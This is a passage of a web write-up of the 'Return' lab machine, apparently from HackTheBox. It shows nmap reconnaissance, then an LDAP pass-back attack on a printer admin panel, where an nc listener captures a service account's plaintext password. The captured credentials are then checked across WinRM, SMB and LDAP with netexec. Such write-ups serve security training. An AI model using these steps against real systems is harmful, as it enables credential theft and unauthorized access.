</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nmap scan">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webapp-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      WebApp inspection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connecting-to-the-printer-service" class="md-nav__link">
    <span class="md-ellipsis">
      Connecting to the printer service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-found-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with found creds
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-svc-printer" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as SVC-PRINTER"
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-user-svc-printer" class="md-nav__link">
    <span class="md-ellipsis">
      Group Membership of user svc-printer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-rights-do-server-operators-have" class="md-nav__link">
    <span class="md-ellipsis">
      🧰 What Rights Do Server Operators Have?
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🧰 What Rights Do Server Operators Have?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dumping-ntdsdit-back-up-and-restore-files" class="md-nav__link">
    <span class="md-ellipsis">
      Dumping NTDS.dit (Back up and restore files)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services" class="md-nav__link">
    <span class="md-ellipsis">
      Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#modifying-and-exploiting-the-service" class="md-nav__link">
    <span class="md-ellipsis">
      Modifying and exploiting the service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250813193600.png" /></p>
<p>[[#windows]] [[NotAssumedBreach]] [[OSCPpath]] [[PrivGroupAbuse]] [[WebApp]]</p>
<p>Tags: #windows #NotAssumedBreach #OSCPpath #PrivGroupAbuse #WebApp<br />
Tools used: <br />
- BurpSuite (web app inspection)<br />
- ldapsearch (ldap enum)<br />
- BloodHound (ldap enum)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<p>First, i generated this template by using my script: <a href="https://github.com/ch3ckkm8/Pentest-Auto-Report-">ch3ckkm8/Pentest-Auto-Report-</a><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python<span class="w"> </span>pentest_to_md.py<span class="w"> </span><span class="m">10</span>.129.165.239<span class="w"> </span><span class="k">return</span>.htb
</span></code></pre></div></p>
<h2 id="add-target-to-etchosts">Add target to /etc/hosts</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;10.129.165.239 return.htb&#39; &gt;&gt; /etc/hosts&quot;</span>
</span></code></pre></div>
<h2 id="nmap-scan">Nmap scan</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="k">return</span>.htb
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>&lt;https://nmap.org&gt;<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-08-03<span class="w"> </span><span class="m">16</span>:19<span class="w"> </span>CDT
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">return</span>.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.165.239<span class="o">)</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.078s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">988</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">|</span>_http-title:<span class="w"> </span>HTB<span class="w"> </span>Printer<span class="w"> </span>Admin<span class="w"> </span>Panel
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="p">|</span><span class="w"> </span>http-methods:
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-08-03<span class="w"> </span><span class="m">21</span>:38:38Z<span class="o">)</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span><span class="k">return</span>.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span><span class="k">return</span>.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>PRINTER<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="p">|</span><span class="w"> </span>smb2-time:
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-08-03T21:38:45
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>18m33s
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>&lt;https://nmap.org/submit/&gt;<span class="w"> </span>.
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span>.84<span class="w"> </span>seconds
</span></code></pre></div><br />
the target appears to be a DC according to the open ports</p>
<p>First, i will try inspecting port 80, which appears to be IIS server, and according to the http title its related to HTB Printer Admin Panel</p>
<h3 id="webapp-inspection">WebApp inspection</h3>
<p><code>Home</code> page:<br />
<img alt="" src="../MediaFiles/image%2012.png" /></p>
<p><code>Settings</code> page:<br />
<img alt="" src="../MediaFiles/image%201%201.png" /></p>
<p>The rest of the pages Fax and Troubleshooting are not clickable.</p>
<p>Taking into consideration of the above screenshots, our target should be the <code>Settings</code> page, since appears to have some functionality by specifying server, port, user and password.</p>
<p>So where do we start with this? well it has some values already filled in, so understand their usage first. Overall it appears to be a webapp that manages a printer, and the settings page manages the authentication towards it. </p>
<p>The password has asterisks instead of characters, and by viewing the page source the password is also displayed as asterisks there too:</p>
<p><img alt="" src="../MediaFiles/image%202%201.png" /></p>
<p>Another thing we could do to see if we can retrieve the password, is to start Burp and inspect the request:<br />
<img alt="" src="../MediaFiles/image%203%201.png" /></p>
<p>It seems that only the ip we specify is actually being sent towards the server-side via the request, and the rest of the values on the settings page are not being sent.</p>
<p>Hmm, the first thing that comes to mind, is the server address (since only that is being sent from the request), it seems that the printer listens on the server address and port we specify. </p>
<hr />
<h1 id="foothold">Foothold</h1>
<h3 id="connecting-to-the-printer-service">Connecting to the printer service</h3>
<p>BUT since we can specify these details, why dont we try to make it connect to our machine? So we could try specifying the server address to our host’s ip, click update and see if we get connection back to our machine.</p>
<p>After updating, i started my listener, and since we dont know exactly the port, i will take for granted that the port is 389 as the preselected values on the settings page implied.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">389</span>
</span></code></pre></div></p>
<p>aand we got connection back!<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">389</span><span class="w"> </span>...
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.3<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.129.165.239<span class="o">]</span><span class="w"> </span><span class="m">64655</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="m">0</span>*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">                       </span>1edFg43012!!
</span></code></pre></div></p>
<p>and the best part is that it just sent us sth that appears to be the password:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>1edFg43012!!
</span></code></pre></div></p>
<p>great! now we have credentials for a valid user <code>svc-printer</code>, the creds for future reference are:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>svc-printer
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>1edFg43012!!
</span></code></pre></div></p>
<h2 id="checking-where-we-can-login-with-found-creds">Checking where we can login with found creds</h2>
<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: <a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span><span class="k">return</span>.htb<span class="w"> </span><span class="s1">&#39;svc-printer&#39;</span><span class="w"> </span><span class="s1">&#39;1edFg43012!!&#39;</span>
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">5985</span><span class="w">   </span>PRINTER<span class="w">          </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:PRINTER<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:return.local<span class="o">)</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">5985</span><span class="w">   </span>PRINTER<span class="w">          </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Copying<span class="w"> </span>default<span class="w"> </span>configuration<span class="w"> </span>file
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">445</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:PRINTER<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:return.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>SMB<span class="w">         </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">445</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!!<span class="w"> </span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>SMB<span class="w">         </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">445</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:PRINTER<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:return.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">389</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">135</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:PRINTER<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:return.local<span class="o">)</span>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>RPC<span class="w">         </span><span class="m">10</span>.129.165.239<span class="w">  </span><span class="m">135</span><span class="w">    </span>PRINTER<span class="w">          </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!!<span class="w"> </span>
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>
